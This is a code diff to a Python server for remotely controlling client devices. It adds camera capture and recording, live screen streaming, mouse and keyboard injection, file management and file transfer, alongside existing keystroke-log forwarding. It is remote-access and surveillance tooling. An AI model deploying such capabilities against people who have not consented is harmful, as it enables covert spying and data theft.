@@ -70,6 +70,63 @@ def register_remote_routes(app, sock, cm):
         cm: ClientManager 实例
     """
 
+    # 摄像头 WebSocket 管理
+    _camera_ws_map = {}
+    _camera_ws_lock = threading.Lock()
+
+    # 屏幕流 WebSocket 管理
+    _screen_ws_map = {}
+    _screen_ws_lock = threading.Lock()
+
+    # 文件传输 WebSocket 管理
+    _file_transfer_ws_map = {}
+    _file_transfer_ws_lock = threading.Lock()
+
+    def _get_camera_ws(client_id):
+        """获取指定客户端的摄像头 WebSocket 连接。"""
+        with _camera_ws_lock:
+            return _camera_ws_map.get(client_id)
+
+    def _register_camera_ws(client_id, ws):
+        """注册摄像头 WebSocket 连接。"""
+        with _camera_ws_lock:
+            _camera_ws_map[client_id] = ws
+
+    def _unregister_camera_ws(client_id):
+        """移除摄像头 WebSocket 连接。"""
+        with _camera_ws_lock:
+            _camera_ws_map.pop(client_id, None)
+
+    def _get_screen_ws(client_id):
+        """获取指定客户端的屏幕流 WebSocket 连接。"""
+        with _screen_ws_lock:
+            return _screen_ws_map.get(client_id)
+
+    def _register_screen_ws(client_id, ws):
+        """注册屏幕流 WebSocket 连接。"""
+        with _screen_ws_lock:
+            _screen_ws_map[client_id] = ws
+
+    def _unregister_screen_ws(client_id):
+        """移除屏幕流 WebSocket 连接。"""
+        with _screen_ws_lock:
+            _screen_ws_map.pop(client_id, None)
+
+    def _get_file_transfer_ws(client_id):
+        """获取指定客户端的文件传输 WebSocket 连接。"""
+        with _file_transfer_ws_lock:
+            return _file_transfer_ws_map.get(client_id)
+
+    def _register_file_transfer_ws(client_id, ws):
+        """注册文件传输 WebSocket 连接。"""
+        with _file_transfer_ws_lock:
+            _file_transfer_ws_map[client_id] = ws
+
+    def _unregister_file_transfer_ws(client_id):
+        """移除文件传输 WebSocket 连接。"""
+        with _file_transfer_ws_lock:
+            _file_transfer_ws_map.pop(client_id, None)
+
     # 注册全局事件回调——转发终端数据和按键记录数据
     def _on_data_event(event_type, client_id, data):
         """全局事件回调：转发终端/按键记录数据到对应 WebSocket。"""
@@ -95,6 +152,30 @@ def register_remote_routes(app, sock, cm):
                 except Exception as e:
                     logger.error(f"按键记录 WebSocket 发送失败: {e}")
                     _unregister_keylog_ws(client_id)
+        elif event_type == 'camera_data':
+            ws = _get_camera_ws(client_id)
+            if ws:
+                try:
+                    ws.send(json.dumps(data, ensure_ascii=False))
+                except Exception as e:
+                    logger.error(f"摄像头 WebSocket 发送失败: {e}")
+                    _unregister_camera_ws(client_id)
+        elif event_type == 'screen_data':
+            ws = _get_screen_ws(client_id)
+            if ws:
+                try:
+                    ws.send(json.dumps(data, ensure_ascii=False))
+                except Exception as e:
+                    logger.error(f"屏幕流 WebSocket 发送失败: {e}")
+                    _unregister_screen_ws(client_id)
+        elif event_type == 'file_transfer_data':
+            ws = _get_file_transfer_ws(client_id)
+            if ws:
+                try:
+                    ws.send(json.dumps(data, ensure_ascii=False))
+                except Exception as e:
+                    logger.error(f"文件传输 WebSocket 发送失败: {e}")
+                    _unregister_file_transfer_ws(client_id)
 
     cm.on_event(_on_data_event)
     logger.info("已注册全局事件回调 _on_data_event")
@@ -244,6 +325,140 @@ def register_remote_routes(app, sock, cm):
             return jsonify(response), status
         return jsonify(response.get('payload', {}))
 
+    @app.route('/api/devices/<client_id>/camera/list')
+    def api_camera_list(client_id):
+        """获取摄像头列表。"""
+        response, status = _sync_forward(client_id, MsgType.CAMERA, {'action': 'list'})
+        if status != 200:
+            return jsonify(response), status
+        return jsonify(response.get('payload', {}))
+
+    @app.route('/api/devices/<client_id>/camera/capture', methods=['POST'])
+    def api_camera_capture(client_id):
+        """摄像头截图。"""
+        response, status = _sync_forward(client_id, MsgType.CAMERA, {'action': 'capture'})
+        if status != 200:
+            return jsonify(response), status
+        return jsonify(response.get('payload', {}))
+
+    @app.route('/api/devices/<client_id>/camera/record/start', methods=['POST'])
+    def api_camera_record_start(client_id):
+        """开始录制。"""
+        response, status = _sync_forward(client_id, MsgType.CAMERA, {'action': 'record_start'})
+        if status != 200:
+            return jsonify(response), status
+        return jsonify(response.get('payload', {}))
+
+    @app.route('/api/devices/<client_id>/camera/record/stop', methods=['POST'])
+    def api_camera_record_stop(client_id):
+        """停止录制。"""
+        response, status = _sync_forward(client_id, MsgType.CAMERA, {'action': 'record_stop'})
+        if status != 200:
+            return jsonify(response), status
+        return jsonify(response.get('payload', {}))
+
+    @app.route('/api/devices/<client_id>/disk')
+    def api_disk(client_id):
+        """获取磁盘分区列表。"""
+        response, status = _sync_forward(client_id, MsgType.DISK, {'action': 'list'})
+        if status != 200:
+            return jsonify(response), status
+        return jsonify(response.get('payload', {}))
+
+    @app.route('/api/devices/<client_id>/disk/io')
+    def api_disk_io(client_id):
+        """获取磁盘IO统计。"""
+        response, status = _sync_forward(client_id, MsgType.DISK, {'action': 'io_stats'}, timeout=15)
+        if status != 200:
+            return jsonify(response), status
+        return jsonify(response.get('payload', {}))
+
+    @app.route('/api/devices/<client_id>/files')
+    def api_files_list(client_id):
+        """获取文件列表。"""
+        path = request.args.get('path', '')
+        response, status = _sync_forward(client_id, MsgType.FILE_MANAGER, {'action': 'list', 'path': path})
+        if status != 200:
+            return jsonify(response), status
+        return jsonify(response.get('payload', {}))
+
+    @app.route('/api/devices/<client_id>/files/roots')
+    def api_files_roots(client_id):
+        """获取根目录列表。"""
+        response, status = _sync_forward(client_id, MsgType.FILE_MANAGER, {'action': 'roots'})
+        if status != 200:
+            return jsonify(response), status
+        return jsonify(response.get('payload', {}))
+
+    @app.route('/api/devices/<client_id>/files/search', methods=['POST'])
+    def api_files_search(client_id):
+        """搜索文件。"""
+        data = request.get_json(silent=True) or {}
+        payload = {'action': 'search', 'path': data.get('path', ''), 'keyword': data.get('keyword', '')}
+        response, status = _sync_forward(client_id, MsgType.FILE_MANAGER, payload, timeout=30)
+        if status != 200:
+            return jsonify(response), status
+        return jsonify(response.get('payload', {}))
+
+    @app.route('/api/devices/<client_id>/files/rename', methods=['POST'])
+    def api_files_rename(client_id):
+        """重命名文件/目录。"""
+        data = request.get_json(silent=True) or {}
+        payload = {'action': 'rename', 'path': data.get('path', ''), 'new_name': data.get('new_name', '')}
+        response, status = _sync_forward(client_id, MsgType.FILE_MANAGER, payload)
+        if status != 200:
+            return jsonify(response), status
+        return jsonify(response.get('payload', {}))
+
+    @app.route('/api/devices/<client_id>/files/delete', methods=['POST'])
+    def api_files_delete(client_id):
+        """删除文件/目录。"""
+        data = request.get_json(silent=True) or {}
+        payload = {'action': 'delete', 'path': data.get('path', '')}
+        response, status = _sync_forward(client_id, MsgType.FILE_MANAGER, payload)
+        if status != 200:
+            return jsonify(response), status
+        return jsonify(response.get('payload', {}))
+
+    @app.route('/api/devices/<client_id>/files/move', methods=['POST'])
+    def api_files_move(client_id):
+        """移动文件/目录。"""
+        data = request.get_json(silent=True) or {}
+        payload = {'action': 'move', 'source': data.get('source', ''), 'destination': data.get('destination', '')}
+        response, status = _sync_forward(client_id, MsgType.FILE_MANAGER, payload)
+        if status != 200:
+            return jsonify(response), status
+        return jsonify(response.get('payload', {}))
+
+    @app.route('/api/devices/<client_id>/files/copy', methods=['POST'])
+    def api_files_copy(client_id):
+        """复制文件/目录。"""
+        data = request.get_json(silent=True) or {}
+        payload = {'action': 'copy', 'source': data.get('source', ''), 'destination': data.get('destination', '')}
+        response, status = _sync_forward(client_id, MsgType.FILE_MANAGER, payload)
+        if status != 200:
+            return jsonify(response), status
+        return jsonify(response.get('payload', {}))
+
+    @app.route('/api/devices/<client_id>/files/mkdir', methods=['POST'])
+    def api_files_mkdir(client_id):
+        """创建目录。"""
+        data = request.get_json(silent=True) or {}
+        payload = {'action': 'mkdir', 'path': data.get('path', '')}
+        response, status = _sync_forward(client_id, MsgType.FILE_MANAGER, payload)
+        if status != 200:
+            return jsonify(response), status
+        return jsonify(response.get('payload', {}))
+
+    @app.route('/api/devices/<client_id>/files/info')
+    def api_files_info(client_id):
+        """获取文件详细信息。"""
+        path = request.args.get('path', '')
+        response, status = _sync_forward(client_id, MsgType.FILE_MANAGER, {'action': 'info', 'path': path})
+        if status != 200:
+            return jsonify(response), status
+        return jsonify(response.get('payload', {}))
+
     # ==================== WebSocket 路由（实时流）====================
 
     @sock.route('/api/devices/<client_id>/terminal/ws')
@@ -361,3 +576,180 @@ def register_remote_routes(app, sock, cm):
                     )
                 except Exception:
                     pass
+
+    @sock.route('/api/devices/<client_id>/camera/ws')
+    def camera_proxy_ws(ws, client_id):
+        """摄像头帧实时流代理。"""
+        if not require_ws_auth(ws):
+            return
+        device = cm.get_device(client_id)
+        if not device or not device.online:
+            ws.close()
+            return
+        loop = getattr(cm, '_ws_loop', None)
+        if loop is None:
+            ws.close()
+            return
+
+        _register_camera_ws(client_id, ws)
+
+        # 发送摄像头打开指令
+        try:
+            open_msg = make_msg(MsgType.CAMERA, client_id, {'action': 'open', 'index': 0})
+            asyncio.run_coroutine_threadsafe(cm.send_to_client(client_id, open_msg), loop)
+        except Exception:
+            pass
+
+        try:
+            while True:
+                data = ws.receive(timeout=None)
+                if data is None:
+                    break
+                # 转发摄像头控制指令到客户端
+                try:
+                    cmd = json.loads(data) if isinstance(data, str) else data
+                    msg = make_msg(MsgType.CAMERA, client_id, cmd)
+                    asyncio.run_coroutine_threadsafe(cm.send_to_client(client_id, msg), loop)
+                except Exception:
+                    pass
+        finally:
+            _unregister_camera_ws(client_id)
+            # 发送摄像头关闭指令
+            try:
+                close_msg = make_msg(MsgType.CAMERA, client_id, {'action': 'close'})
+                asyncio.run_coroutine_threadsafe(cm.send_to_client(client_id, close_msg), loop)
+            except Exception:
+                pass
+
+    @sock.route('/api/devices/<client_id>/screen/ws')
+    def screen_proxy_ws(ws, client_id):
+        """屏幕帧实时流代理（只接收帧数据，不处理控制）。"""
+        if not require_ws_auth(ws):
+            return
+        device = cm.get_device(client_id)
+        if not device or not device.online:
+            ws.close()
+            return
+        loop = getattr(cm, '_ws_loop', None)
+        if loop is None:
+            ws.close()
+            return
+
+        _register_screen_ws(client_id, ws)
+
+        # 发送屏幕流启动指令
+        try:
+            start_msg = make_msg(MsgType.SCREENSHOT, client_id, {'action': 'start', 'fps': 5, 'quality': 75})
+            asyncio.run_coroutine_threadsafe(cm.send_to_client(client_id, start_msg), loop)
+        except Exception:
+            pass
+
+        try:
+            while True:
+                data = ws.receive(timeout=None)
+                if data is None:
+                    break
+                # 只处理屏幕流控制指令（config）
+                try:
+                    cmd = json.loads(data) if isinstance(data, str) else data
+                    if cmd.get('action') in ('config', 'stop'):
+                        msg = make_msg(MsgType.SCREENSHOT, client_id, cmd)
+                        asyncio.run_coroutine_threadsafe(cm.send_to_client(client_id, msg), loop)
+                except Exception:
+                    pass
+        finally:
+            _unregister_screen_ws(client_id)
+            # 发送屏幕流停止指令
+            try:
+                stop_msg = make_msg(MsgType.SCREENSHOT, client_id, {'action': 'stop'})
+                asyncio.run_coroutine_threadsafe(cm.send_to_client(client_id, stop_msg), loop)
+            except Exception:
+                pass
+
+    @sock.route('/api/devices/<client_id>/control/ws')
+    def control_proxy_ws(ws, client_id):
+        """独立控制 WebSocket：处理鼠标和键盘操作。"""
+        if not require_ws_auth(ws):
+            return
+        device = cm.get_device(client_id)
+        if not device or not device.online:
+            ws.close()
+            return
+        loop = getattr(cm, '_ws_loop', None)
+        if loop is None:
+            ws.close()
+            return
+
+        try:
+            while True:
+                data = ws.receive(timeout=None)
+                if data is None:
+                    break
+                try:
+                    cmd = json.loads(data) if isinstance(data, str) else data
+                    msg_type = cmd.get('type', '')
+
+                    if msg_type == 'mouse':
+                        # 鼠标控制
+                        action = cmd.get('action', '')
+                        x = cmd.get('x', 0)
+                        y = cmd.get('y', 0)
+                        button = cmd.get('button', 0)
+                        msg = make_msg(MsgType.MOUSE, client_id, {'action': action, 'x': x, 'y': y, 'button': button})
+                        asyncio.run_coroutine_threadsafe(cm.send_to_client(client_id, msg), loop)
+
+                    elif msg_type == 'keyboard':
+                        # 键盘控制
+                        action = cmd.get('action', 'hotkey')
+                        if action == 'combo':
+                            combo = cmd.get('combo', '')
+                            msg = make_msg(MsgType.KEYBOARD, client_id, {'action': 'combo', 'combo': combo})
+                        elif action == 'press':
+                            key = cmd.get('key', '')
+                            msg = make_msg(MsgType.KEYBOARD, client_id, {'action': 'press', 'key': key})
+                        else:
+                            keys = cmd.get('keys', [])
+                            msg = make_msg(MsgType.KEYBOARD, client_id, {'action': action, 'keys': keys})
+                        asyncio.run_coroutine_threadsafe(cm.send_to_client(client_id, msg), loop)
+                except Exception:
+                    pass
+        finally:
+            pass
+
+    @sock.route('/api/devices/<client_id>/file-transfer/ws')
+    def file_transfer_proxy_ws(ws, client_id):
+        """文件传输双向代理。"""
+        if not require_ws_auth(ws):
+            return
+        device = cm.get_device(client_id)
+        if not device or not device.online:
+            ws.close()
+            return
+        loop = getattr(cm, '_ws_loop', None)
+        if loop is None:
+            ws.close()
+            return
+
+        _register_file_transfer_ws(client_id, ws)
+
+        try:
+            while True:
+                data = ws.receive(timeout=None)
+                if data is None:
+                    break
+                # 转发文件传输指令到客户端
+                try:
+                    cmd = json.loads(data) if isinstance(data, str) else data
+                    msg_type = MsgType.FILE_TRANSFER_DATA if cmd.get('type') == 'data' else MsgType.FILE_TRANSFER
+                    msg = make_msg(msg_type, client_id, cmd)
+                    asyncio.run_coroutine_threadsafe(cm.send_to_client(client_id, msg), loop)
+                except Exception:
+                    pass
+        finally:
+            _unregister_file_transfer_ws(client_id)
+            # 取消活动传输
+            try:
+                cancel_msg = make_msg(MsgType.FILE_TRANSFER, client_id, {'action': 'cancel'})
+                asyncio.run_coroutine_threadsafe(cm.send_to_client(client_id, cancel_msg), loop)
+            except Exception:
+                pass
